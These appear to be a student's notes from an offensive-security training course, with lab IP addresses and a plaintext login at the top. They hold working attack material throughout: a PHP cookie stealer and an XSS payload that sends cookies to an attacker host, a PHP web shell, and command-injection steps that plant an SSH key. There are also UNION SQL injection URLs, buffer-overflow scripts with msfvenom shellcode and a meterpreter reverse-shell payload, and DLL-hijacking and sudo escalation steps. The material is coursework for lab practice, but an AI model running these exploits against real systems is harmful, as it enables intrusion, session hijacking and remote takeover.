GRRG-503-M
9GbRCKc43SzluEG
10.50.20.250:8000
10.50.39.165
student:9GbRCKc43SzluEG
!! Why do they not post the Student Facilitation Guide the day before class, the first day has too much information too fast and it is stressful. It would be less stressful if they just released the FG
the night before, setting us up for success !!

#############################################
Penetration Testing Phases :: Network Scanning/Recon :: Exploitation Research
#############################################
--- Penetration Testing Phases ---
* Penetration testing is used to expose vulnerabilities *
Phase 1 - Mission Definition
  mission goals and targets
  scope of mission
  Rules of Engagement (RoE)
Phase 2 - Recon
  gathering information from public sources
Phase 3 - Footprinting
  scanning or interaction with the target
Phase 4 - Exploitation and Initial Access
Phase 5 - Post-Exploitation
  establish persistence
  escalate privileges
  cover tracks
  exfilitrate data
Phase 6 - Document Mission

--- Scanning and Reconnaissance ---
OSINT -  Open Source Intelligence
  https://webbreacher.files.wordpress.com/2018/07/data-collection3.png?w=1136
1. Host Discovery
  Ping Sweep - to see what hosts are alive quickly (narrow the scope)
2. Port Enumeration
  Nmap Scan - will check to see what ports are available
3. Port Interrogation
  what service is running on each open port
Hyper-Text Markup Language (HTML) - Markup language for browser interpretation
NMAP Scripts 
  /usr/share/nmap/scripts
  nmap --script <filename>|<category>|<directory>
  nmap --script-help
  nmap --script-help <filename>|<category>|<directory>

--- SCRAPE DEMO ---
Run firefox from terminator
  Google "Quotes to Scrape"
    https://quotes.toscrape.com/
sudo apt-get install python-lxml python-requests python3-pip -y
vim webscrapper.py   # scrapes the website to grab indivudal tags and data from them
  change class, tag, and website as needed
--- PING SWEEP DEMO ---
for i in {1..254}; do(ping -c 1 10.50.22.$i | grep "bytes from" &) ; done
  IN-DEPTH (IP-ONLY) 
    for i in {1..254}; do(ping -c 1 10.50.22.$i | grep "bytes from" &) ; done | awk '{print $4}' | sed 's/.$//'
--- NMAP DEMO ---
nmap -v -sT -Pn -T4 <IP_Address>
  nmap -v -sT -Pn -T4 <IP_Address> -p-  # deliberate scan for every port
nmap -v -sT -Pn -T4 --script http-robots.txt.nse <IP_Address> -p 80  # in-depth on service on port 80 using nmap script http-robots.txt.nse
nmap -v -sT -Pn -T4 --script http-enum.nse <IP_Address> -p 80  # more aggressive search for service on port 80 using nmap script http-enum.nse
nmap -v -sT -Pn -T4 --script discovery <IP_Address> # extracts as much information as possible on all open ports
sudo apt-get install nikto
  nikto -h <IP_Address>
--- VULNERABILITY DEMO ---
Google Exploit DB
  search term you want to find exploits on

#############################################
Web Exploitation (xss,cmd injection, etc)
#############################################

xfreerdp /u:student /v:10.50.37.177 +glyph-cache +clipboard +dynamic-resolution
Server - provides services
Client - requests services
HTTP Methods ::
  Get - pulling information from a web server
  Post - posting information to the web server
  Head - etrieve meta-information about a resourceof a web server without transmitting actual data.
  Put - replaces some already existing information on the web server
HTTP Response Code ::
  10X == Informational
  2XX == Success
  30X == Redirection
  4XX == Client Error
  5XX == Server Error
User-Agent String - identifies the client's browser and operating system
Cross-Site Scripting (XSS)
  A form of attack where untrusted javascript is injected into a trusted website
  This occurs when input from a user is displayed back without proper sanitization.
    such as GET POST and PUT
  Allows stealing of cookies, and session hijacking
  Reflected  :: not persistent, reflects off the web server
    When a user is tricked into clicking on a malicious link, the injected code travels to the vulnerable web site. The browser then executes the code because it came from a "trusted" server
  Stored :: Actually stored on the web server, more persistent
    Where the injected script is permanently stored on the target servers. The victim then retrieves the malicious script from the server when it requests the stored information
Server-Side Injection
  Directory Traversal :: accessing the file system of that web server that outside of the intended scope of the developers
  Command Injection :: some input received from a user is used in command execution on the server-side in a way that allows a malicious actor to execute additional arbitrary commands 
  SSH Key Upload :: By uploading our key to the target, we can give ourselves access without needing a password

--- JAVA SCRIPT DEMO ---
1. Go to the web server   # <IP_Address>
  You can use your nmap scripts to see what webpages are available such as http-robots.txt.nse and http-enum.nse
2. Navigate to <IP_Address>/robots.txt   # shows you where you are allowed and not allowed to go
3. Navigate to <IP_Address>/java   # Java script pages
4. Open up DevConsole   # Hit F12
  Here you are reading the Java code trying to understand it as if you were reading psuedocode
--- STORED XSS DEMO ---
1. Navigate to web server
2. Navigate to <IP_Address>/chat/messageb.php
3. Make a document in /var/www/html called cookiefile.txt
4. Make a document in / called Cookie_stealer1.php and input
  <?php
  $cookie = $_GET["username"];
  $steal = fopen("/var/www/html/cookiefile.txt", "a+");
  fwrite($steal, $cookie ."\n");
  fclose($steal);
  ?>
4.. Enter following code for cookie stealer script
 <script>document.location="http://10.50.20.97/Cookie_Stealer1.php?username=" + document.cookie;</script>
5. Now look at the URL
    <script> "hello" </script>  # if this works than it accepts untrusted javascript code
--- SERVER-SIDE INJECTION DEMO ---
1. Navigate to <IP_Address>/path
  in pathdemo.php
    ../../../../../etc/passwd   # the ../ is because we do not know where we land in the directory so we need to naviagte far bar to read the files
      this gives us all of the user-names specifically www-data and their home directory   # www-data is the admin for the webserver
    ../../../../../etc/hosts
--- COMMAND INJECTION DEMO ---
1. Navigate <IP_Address>/cmdinjection
  in cmdinjectiondemo.php
    ;whoami  # the command will only work if the semi-colon is placed in front of the command
    ;cat /etc/passwd
    ;ls -latr /var/www
    ;cat /etc/hosts
    ;netstat -ntulp
--- SSH KEY UPLOAD ---
1. on lin-ops create ssh public key
  do not change location or enter passphrase
  copy the public key
2. Command injection
  see above
  ;whoami
  ;cat /etc/passwd
  ;ls -la /var/www   # home directory of web server admin
  ;mkdir /var/www/.ssh   # making ssh directory
  ;ls -la /var/www/   # validating there is a .ssh director
  ;cat /var/www/.ssh/authorized_keys  # file should already be generated
3. upload key to authorized key file
  ;echo "<ssh_key>" >> /var/www/.ssh/authorized_keys
  ;cat /var/www/.ssh/authorized_keys
4. On the linops
  ssh www-data@<IP_Address>
    no password needed
--- MALICIOUS FILE UPLOAD DEMO ---
1. Navigate to <IP_Address to <IP_Address>/uploads
2. Make a script on your rdp session in notepad and save it as badupload.php on your desktop
    <HTML><BODY>
    <FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <?php
    if($_GET['cmd']) {
      system($_GET['cmd']);
      }
    ?>
    </pre>
    </BODY></HTML>
3. Upload it to the site
4. Go to the parent directory and navigate to the uplaod
  cat /etc/passwd

#############################################
Web Exploitation - SQL Injection
#############################################
Structured Query Language (SQL) 
COMMANDS ::
  select  - extracts data
  uinion  - combine results of two or more select statements
  use  - selects database for use
  update
  delete
  insert into 
SQL Injection ::
  Require valid SQL queries
  Systems can be vulnerable dur to misconfiguration
  Information_Schema is default and always exists
  Input field Sanitization
    Unsanitized - can be found using single quotes; will return extra information, may show no errors
    Sanitized - input fields are checked for items that might harm the database
    Validation - checks to ensure input meets criteria

--- EXAMPLES ---
SELECT * FROM table_name # selects all column values
SELECT column1,column2,etc FROM table_name  # selects multiple columns from a given table
SELECT column FROM table_name  # selects all column value even duplicates
SELECT DISTINCT column FROM table_name  # shows only distinct colomn values
--- SQL INJECTION VALIDATION DEMO ---
1. Go to web server <IP_Address>
2. Check to see whats normal
  try and normal password and username
3. Try SQL Injection Validation
  joe' OR 1='1  for both username and password
4. Pull up DevTools and go under Network, click login.php, and switch it to request and raw on the right side
5. In your search bar enter the following formation
  <IP_Address>/login.php?username=joe' OR 1='1&passwd=joe' OR 1='1
    sometimes just type or 1=1 with no qoutes if ' OR 1='1 doesn't work
6. whatever the hell this is 
  <IP_Address>/uniondemo.php?Selection=2 UNION select table_schema, table_name, column_name FROM information_schema.columns
  ex->
  http://10.50.40.232/uniondemo.php?Selection=3 UNION SELECT username,passwd,pin FROM session.userinfo
  http://10.50.40.232/uniondemo.php?Selection=3 UNION SELECT id,name,pass FROM session.user
7. Version information
  <IP_Address>/uniondemo.php?Selection=3 UNION select 1,2,@@version
  ex->
  10.50.40.232/uniondemo.php?Selection=3 UNION select 1,2,@@version
  
#############################################
Reverse Engineering 1-3
#############################################

%rax :: the first return register
%rbp :: the base pointer that keeps track of the base of the stack
%rsp :: the stack pointer that points to the top of the stack
TERMS
Heap - Memory that can be allocated and deallocated
Stack - A contiguous section of memory used for passing arguments
General Register - A multipurpose register that can be used by either programmer or user to store data or a memory location address
Control Register - A processor register that changes or controls the behavior of a CPU
Flags Register - Contains the current state of the processor
INSTRUCTION POINTERS
MOV  :: move source to destination
PUSH :: push source onto stack
POP  :: Pop top of stack to destination
INC  :: Increment source by 1
DEC  :: Decrement source by 1
ADD  :: Add source to destination
SUB  :: Subtract source from destination
CMP  :: Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
JMP  :: Jump to specified location
JLE  :: Jump if less than or equal
JE   :: Jump if equal
WORKFLOW
file:///home/madison.r.greenberg43/Downloads/Reverse_engineering_workflow.pdf

--- ASSEMBLY DEMO ---
main:
  move rax, 16    # moving the value of 16 into the register of rax
  push rax        # pushing the register rax onto the stack
  jmp mem2        # jump to the function mem2
mem1:
  mov rax, 0      # moving the value of 0 into the register of rax
  ret             # return
mem2:
  pop r8          # pop the top of the stack to the detination of r8
  cmp rax, r8     # compare the  value of r8 to the the register rax
  je mem1         # if the values are equal ju,p to mem1



#############################################
Exploit Development - Functional :: Exploit Development - Buffer Overflow 1-2
#############################################
Buffer overflow is a condiiton exists when the computer attempts to put more data in the buffer than it can hold, or when a program puts too much data in a buffer space
  Corrupt Data
  Crash the Program
  Or Execute Malicious Code
Heap - allocated and deallocated mmeory as needed
Stack - used for passing arguments to other functions
Registers - storage elements
Stack Pointer - contains the space to the next avilable place on the stack
Base Pointer - points at the base of the stack
DEFENSES 
  Non-Executabe Stack
    Marking the allocated memory for the stack as non-executable is prudent
  Address Space Layout Randomization (ASLR)
    Pseudo-randomizes the memory addresses of the stack, running processes and shared objects in memory
  Data Execution Prevention (DEP)
    Data is data, and not code and should never execute
  Stack Canaries
    Change every time a program executes
STEPS
  Analyze the program
        Static analysis 
        Run the file command
        Run the strings command
            Disassemble
            Decompile 
            ldd 
            hashing 
            Submit 
            Symbols and sections 
        Dynamic analysis 
        Memory analysis 
After performing basic analysis of the program, determining how you will interact with the program is often relatively straight forward. If it has a listening port, then you can send input/commands using tools like netcat or bash sockets. If it is a command line program that has interactive prompts, then interacting or fuzzing the program locally may be all that is required. This step could take some effort and to document every possible way to interact with the program is futile.
Configure the environment determined in step 2 and install necessary tools to assist in interacting with or fuzzing the program (i.e. netcat, python, etc).
Utilizing information gathered, fuzz the binary with different values and lengths of values to determine if you can create a segmentation fault. If you produce a general protection fault, reduce the length of values and attempt to get it to create a segmentation fault. A general protection fault can occur when stomping on kernel space virtual memory. On 64-bit systems, user-space virtual memory is allocated and locked using the lower 47 bits of the address; therefore, it is limited to the address range of 0x0 to 0x7fffffffffff. If the instruction pointer (IP) is greater than 0x7fffffffffff, you will get a general protection fault, and your buffer overflow attempt will fail. A segmentation fault occurs when the program attempts to access memory that hasn’t been allocated or is not allowed to access within the boundaries of the virtual memory assigned to it.
If you can successfully generate a segmentation fault, determine the quantity of characters until the IP is overwritten. To do this, you can create your own pattern and then calculate the offset based on the characters in the input that overwrote IP. There are freely available tools that provide this functionality such as Metasploit’s pattern-create.rb, the GNU debugger (gdb) plugin peda running the command pattern create, and the Immunity Debugger plugin mona running the command pattern_create, or a locally developed tool /sec_tools/patternManager.py can be used to generate the input pattern.
Run the exploitable binary in a debugger and send the newly generated pattern as input in the same way you fuzzed it.
When the debugger stops, view the contents in the IP. The IP should contain a portion of values from the pattern it generated for you in Step 5. Input this value into the companion program or command that you used to create the pattern. Metasploit’s companion tool is pattern_offset.py, the GNU debugger (gdb) plugin peda running the command pattern offset, and the Immunity Debugger plugin mona running the command pattern_offset, or the locally developed /sec_tools/patternManager.py command provides a dual purpose of also determining the offset. (Be sure to use the companion program from the same suite as they are not compatible with each other)
Modify your exploit assembly script to create a file with the following using the pattern offset determined in the previous step: A * pattern_offset + B*4
Rerun the binary in the debugger and read the input created above.
Check to make sure that the EIP contains all B's (hex 0x42). If it does not, change the value of your pattern_offset and rerun the binary until the EIP contains all B's.
After you have confirmed your offset, rerun your debugger and determine the value of the IP to execute injected shell code. In most cases, your shellcode will immediately follow the overwritten IP, You can also find vulnerable portions of the binary that can be used to execute the shellcode based on register contents.
To use registers contents to alter the code path, use tools such as Metasploit’s msfpescan to search Windows executables, and msfelfscan to search Linux executables. If you are using Immunity and mona, then you can use the jmp command to find code that can be repurposed to execute the injected shellcode on the stack. If you are using the GNU debugger (gdb) plugin peda, then you can use the jmpcall command to find code to repurpose in order to execute the injected shellcode.
Once you find the address of where your shellcode resides on the stack or the address of the code you will repurpose to jump to the contents of that register, replaces the B’s from the attack script with that address.
Rerun the debugger and test your attack script. Make sure the EIP is filled with the memory address you added to your attack script.
Check for bad characters by passing all possible characters that can be passed to the program, evaluate the results, and take note of characters than cannot be processed. You may have to create a file to read it, or redirect to the program.
Using MSVenom, enter known bad characters and develop shellcode to inject into the attacked binary.
Modify attack script to incorporate the shellcode to look like: A * pattern_offset + mem_address + exploit
You may need to add padding in the for m of NOPs. In this case your attack script will need to add them between the return address and exploit: shellcode A * pattern_offset + mem_address + "0x90"*32 + exploit
Launch the binary without the debugger. Launch a netcat listener according to how you created your payload. Launch your attack script.
Your NC listener should now be connected to a remote shell on the exploited box.

VULENERBALE FUNCTIONS
strcpy
strcat
printf
get


--- LINUX ---
1. gdp <executable>    # this opens gdb-peda
2. disass main   # dissasembles the main function
  you can do this with all functions in the program
3. run               # within gdp-peda
  Warning: not running   # try again and add more
4. run with longer input
  Segmentation Fault     # this is how you know the buffer has been overflowed
5. Go to the follow website
  https://wiremask.eu/tools/buffer-overflow-pattern-generator/
6. create a python script for exploit    # on linops
  The length of the EIP is 4 bytes
  using wiremask get a randomly generated 200 character pattern
########## Starting Script
<
  buffer = "<200 character string>"
  
  EIP = "BBBB"
  
  nop = '\x90' * 5
  
  print(buffer + EIP + nop)
>

7.. run the executable using your script as user input  # in gdb-peda
  run <<< $(python lin_buf.py)
8. Take the EIP value and input it into wiremask in the Register Value box
  # This will give you the byte offset of the EIP
9. back in the script 
  Change the bufer value to "A" *  the byte offset value
10. Run the executable using your script as user input again
  run <<< $(python lin_buf.py)
11. exit gdb-peda
12. env - gdb <executable>   # this just runs gdb instead of gdb-peda
  show env
  unset env LINES
  unset env COLUMNS
  show env
13. run the program
14. info proc map
  look for [heap]  # you want the first address after [heap] all the way to the end of the stack
15. find /b 0xf7de1000 , 0xffffe000, 0xff, 0xe4   # the last to is searching for jump ESP address locations
  # this is the first and last address as explained above
16. Copy first five values
17. Within the script comment out the EIP line
18. Paste values into script and comment them out
19. Set a new eip value to the reverse value of one of the addresses pasted in 
  for example
    0xf7f645fb     bceomes
    "\xfb\x45\xf6\xf7"
20. load msfconsole    # in a separate linops terminal
  use payload/linux/x86/exec
    show options
  set CMD whoami
    show options
  generate -b "\x00" -f python 
21. paste the payload generated into your script
  modify print statement and add "+ buf"
########## Ending Script
<
buffer = "A" * 62

#EIP = "BBBB"

eip = "\xfb\x45\xf6\xf7"

#0xf7de3b59
#0xf7f588ab
##0xf7f645fb
#0xf7f6460f
#0xf7f64aeb

buf =  b""
buf += b"\xdd\xc5\xbf\xcc\xfc\x18\xdf\xd9\x74\x24\xf4\x5d"
buf += b"\x2b\xc9\xb1\x0b\x31\x7d\x19\x03\x7d\x19\x83\xc5"
buf += b"\x04\x2e\x09\x72\xd4\xf6\x6b\xd1\x8c\x6e\xa1\xb5"
buf += b"\xd9\x89\xd1\x16\xa9\x3d\x22\x01\x62\xdf\x4b\xbf"
buf += b"\xf5\xfc\xde\xd7\x01\x02\xdf\x27\x79\x6a\xb0\x46"
buf += b"\xe8\x03\x4e\xde\xa1\x5a\xaf\x2d\xc5"
nop = '\x90' * 5

print(buffer + eip + nop + buf)
>
22. On linops run the func executable using the script as userinput
  sudo ./func <<< $(python lin_buf.py)

--- WINDOWS ---
1. run the program
2. open the program in Immunity Debugger ensure the program in paused
3. create a script called win_buf.py
############# Starting Script
<
import socket

buf = "TRUN /.:/"
buf += "A" * 5000   # 5000 Characters from pattern generator

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)  # IPv4 socket, TCP Protocol
s.connect(("10.50.37.177", 9999))   # Target IP and port
print s.recv(1024)
s.send(buf)   #Send the value of buf
print s.recv(1024)
s.close()
>
4. Go to wiremask and get a 5000 character string and paste it into the script
5. start running your script and then then unpause immunity debugger
6. copy the EIP
  ex-> 386F4337
7. paste into wiremask and get offset value
  ex-> 2003
8. delete long character line and replace the value 5000 with the offset value
  ex-> buf += "A" * 2003
9. close out of immunity debugger and re run it
10. re-run and re-attach program to immunity debugger
11. make sure the program is paused
12. at the bottom of immunity debugger run this command
  !mona jmp -r esp -m "essfunc.dll"
13. right click one of the pointer and copy the address to your clipboard
  ex-> 0BADF00D
14. adjust your script by adding that address backwards and the nop sled
  ex-> buf += "\x0d\xf0\xad\x0b"
  ex-> buf += "\x90" * 10
15. Generate a malicious payload using msfvenom and msfconsole
  msfconsole
    msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.22.28 lport=4444 -b "\x00" -f python
16. copy the payload, except for the first line and paste it into the script 
  ex-> bug = b""    # DO NOT COPY THIS LINE
17. msfconsole
  use multi/handler
    show options
  set payload windows/meterpreter/reverse_tcp
    show options
  set LHOST 10.50.22.28
    show options 
18. run secureserver then type exploit in msfconsole and then run your script


#############################################
Post exploitation :: Local Host Enumeration
#############################################
Schdeuled Tasks
Register Keys Run and RunOnce
Services
Crontab
.bashrc
SSK-Keys
/var/www
/etc/hosts
1. Enumerate the User information
  net user :: net localgroup
  cat /etc/passwd :: who :: groups    # groups are just the groups of the current user
2. Runing Processes
  tasklist /v :: task manager   # task manager is the gui version of tasklist
  ps -elf :: pstree :: lsof
3. Services
  tasklist /svc
  systemctl    # systemctl list-units --type service | grep running
4. Check for connections
  ipconfig /all :: netstat -anob :: arp -a :: route print  # the b in the netstat options can only be can as an administrator
  ip a or ip n :: netstat -anopp :: arp -an :: ip route(route)(netstat -r)
5. Obfuscation
  SCP
find / -iname <Search_Key> 2>/dev/null
rsyslog is a remote logging system

#############################################
Privilege Escalation :: Maintaining Persistence :: Covering Tracks - Windows
#############################################
DLLs
  HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
  The directory the Application was run from
  The current directory
UAC Settings
  reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
AutoElevate Executables
  sigcheck -m C:\<PATHWAY TO FILE>      # sigcheck is a sysinternals tool
    looking for reqestedExecutionLevel    # Under Security
Scheduled Tasks and DLL Injection
  schtasks /query /fo LIST /v
  schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive -Context 0,6 | Select-String -Pattern "COM handler" -NotMatch    
  # "Task To Run" can also be changed to "Run As User"
  Idnetify vulnerable task
    C:\Users\student\exercise_2\putty.exe
  Identify information we can use for research on a vulnerability
    sigcheck c:\users\student\exercise_2\putty.exe
  Check if you can write to directory
    icacls "c:\users\student\exercise_2"
  Procmon
    run executable to find dlls it uses and where they are located
    Ctrl + L
      add filters
        Process Name contains <name of executable>
          putty.exe
        Path contains <.dll>
        Result contains NAME NOT FOUND
     choose a dll that is in the same directory as the executbale
  Go To LINOPS Machine
    msfvenom -p windows/exec CMD='cmd.exe /C whoami > C:\\whoami.txt' -f dll > <name of dll>.dll   # the name of dll for this purpose is SSPICLI.dll
  SCP the dll from linops to the machine
    scp student@10.50.2.28:/home/student/Security/Day7/SSPICLI.dll C:\users\student\exercise_2    # from where your created on the linops machine to the directory in which the executable is in
Vulnerable Services
  Type Services (In the search bar) 
    sort by Description   # if they don't have the description than they are probably what you are looking for
  reg query HKLM\SYSTEM\CurrentControlSet\Services\ /s /v ImagePath | Select-String -Pattern "ImagePath" -CaseSensitive | Select-String -Pattern "system32" -NotMatch   # Powershell Command
  Identify Vulnerable Services
    7z.exe
  Test Path
    icacls "C:\Program Files\7-Zip\"
  On LINOPS
    msfvenom -p windows/exec CMD='cmd.exe /C whoami > C:\\whoami.txt' -f exe > 7z.exe
  Move the document to windows
    scp student@10.50.2.28:/home/student/Security/Day7/evil.exe "C:\Program Files\7-Zip\7z.exe"
Common Places to look for Persistence
  HKLM\Software\Microsoft\Windows\CurrentVersion\Run or RunOnce
  HKCU\Software\Microsoft\Windows\CurrentVersion\Run or RunOnce
  Scheduled Tasks and Services
  
#############################################
Privilege Escalation Activities :: Maintaining Persistence Activities :: Covering Tracks - Linux
#############################################
Places to look for Rsyslog
/etc/rsyslog.d/*
/etc/rsyslog.conf
<facility>.<priority>      # rsyslog log file is set up like this

--- DEMO ---
1. sudo -l
  /usr/bin/apt-get
2. Look up GTFO bins
  look up apt-get and click sudo   # this will give a way to elevate your privileges
  copy the command
3. run $PATH to see if /usr/bin is in the pathway
4. run the command using sudo
  sudo apt-get changelog apt
    !/bin/bash    # enter this after you run the first command

1. set a dot in the path
  PATH=.:$PATH

1. Find the files with the SUID bit set 
  find / -type f -perm /4000 -ls 2>/dev/null
2. Find the files with the SGID bit set
  find / -type f -perm /2000 -ls 2>/dev/null
3. Look up GTFO bins
  start looking up all of the binaries with the suid or sgid bit set, until you get a hit with suid as an option

john --wordlist=Wordlist.txt shadowfile





















